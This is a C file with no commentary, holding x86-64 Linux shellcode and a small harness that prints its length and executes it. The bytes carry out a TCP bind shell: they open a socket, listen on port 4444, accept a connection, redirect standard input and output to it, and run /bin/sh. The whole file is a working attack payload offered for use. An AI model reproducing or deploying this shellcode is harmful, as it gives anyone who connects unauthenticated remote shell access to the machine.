#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = \
"\x48\x31\xff\x48\xf7\xe7\x48\x83\xc0\x29\x48\x83"
"\xc7\x02\x52\x5e\x48\xff\xc6\x0f\x05\x48\x89\xc7"
"\x48\xff\xce\x48\xf7\xe6\x04\x31\x52\x66\x52\x66"
"\x52\x66\x68\x11\x5c\x48\xff\xc2\x48\xff\xc2\x66"
"\x52\x80\xc2\x0e\x48\x89\xe6\x0f\x05\x48\xf7\xe6"
"\x48\x83\xc0\x32\x48\xff\xc6\x48\xff\xc6\x0f\x05"
"\x48\xf7\xe2\x48\x83\xc0\x2b\x48\x83\xec\x10\x48"
"\x89\xe6\xc6\x44\x24\xff\x10\x48\x83\xec\x01\x48"
"\x89\xe2\x0f\x05\x49\x89\xc1\x48\x31\xc0\x48\x83"
"\xc0\x03\x0f\x05\x48\x31\xf6\x48\xf7\xe6\x4c\x89"
"\xcf\x48\x83\xc0\x21\x50\x0f\x05\x58\x50\x48\xff"
"\xc6\x0f\x05\x58\x50\x48\xff\xc6\x0f\x05\x48\x31"
"\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
"\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6"
"\x48\x83\xc0\x3b\x0f\x05";
int main()
{
 printf("Shellcode Length:  %d\n", strlen(shellcode));
 int (*ret)() = (int(*)())shellcode;
 ret();
}